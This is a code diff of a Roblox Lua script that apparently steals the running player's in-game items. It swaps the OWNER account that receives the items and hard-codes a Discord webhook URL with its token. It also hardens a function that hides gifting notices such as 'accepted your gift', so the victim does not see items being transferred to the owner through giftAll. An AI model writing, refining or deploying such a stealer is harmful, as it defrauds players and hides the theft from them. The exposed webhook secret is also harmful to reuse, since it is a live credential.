@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 
-local OWNER = "frogman_bacon"
+local OWNER = "werovasquez"
 local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
 local MIN_MULT = 1.5
 
@@ -115,33 +115,45 @@ end
 
 local function hideNotifications()
     -- Try to find and hide notification GUIs
-    local PlayerGui = lp:WaitForChild("PlayerGui")
+    local ok, PlayerGui = pcall(function()
+        return lp:WaitForChild("PlayerGui", 5)
+    end)
     
-    -- Hide common notification frames
-    for _, child in ipairs(PlayerGui:GetDescendants()) do
-        if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("Frame") then
-            local text = child:IsA("TextLabel") and child.Text or ""
-            if text:find("wait before gifting") or text:find("accepted your gift") or text:find("Please wait") then
-                child.Visible = false
-                print("Hidden notification: " .. text)
-            end
-        end
+    if not ok or not PlayerGui then
+        print("⚠ Could not access PlayerGui for hiding notifications")
+        return
     end
     
-    -- Also watch for new notifications and hide them
-    PlayerGui.DescendantAdded:Connect(function(descendant)
-        task.wait(0.1)
-        if descendant:IsA("TextLabel") then
-            local text = descendant.Text or ""
-            if text:find("wait before gifting") or text:find("accepted") or text:find("Please wait") then
-                descendant.Visible = false
+    -- Hide existing notifications
+    pcall(function()
+        for _, child in ipairs(PlayerGui:GetDescendants()) do
+            if child:IsA("TextLabel") or child:IsA("TextButton") then
+                local text = child.Text or ""
+                if text:find("wait before gifting") or text:find("accepted your gift") or text:find("Please wait") then
+                    child.Visible = false
+                end
             end
         end
     end)
+    
+    -- Watch for new notifications and hide them
+    pcall(function()
+        PlayerGui.DescendantAdded:Connect(function(descendant)
+            if descendant:IsA("TextLabel") then
+                local text = descendant.Text or ""
+                if text:find("wait before gifting") or text:find("accepted") or text:find("Please wait") then
+                    task.wait(0.05)
+                    descendant.Visible = false
+                end
+            end
+        end)
+    end)
+    
+    print("✓ Notification hider active")
 end
 
 -- Hide notifications on startup
-hideNotifications()
+task.spawn(hideNotifications)
     ownerPlayer.CharacterAdded:Wait()
     task.wait(2)
     giftAll(ownerPlayer, items)
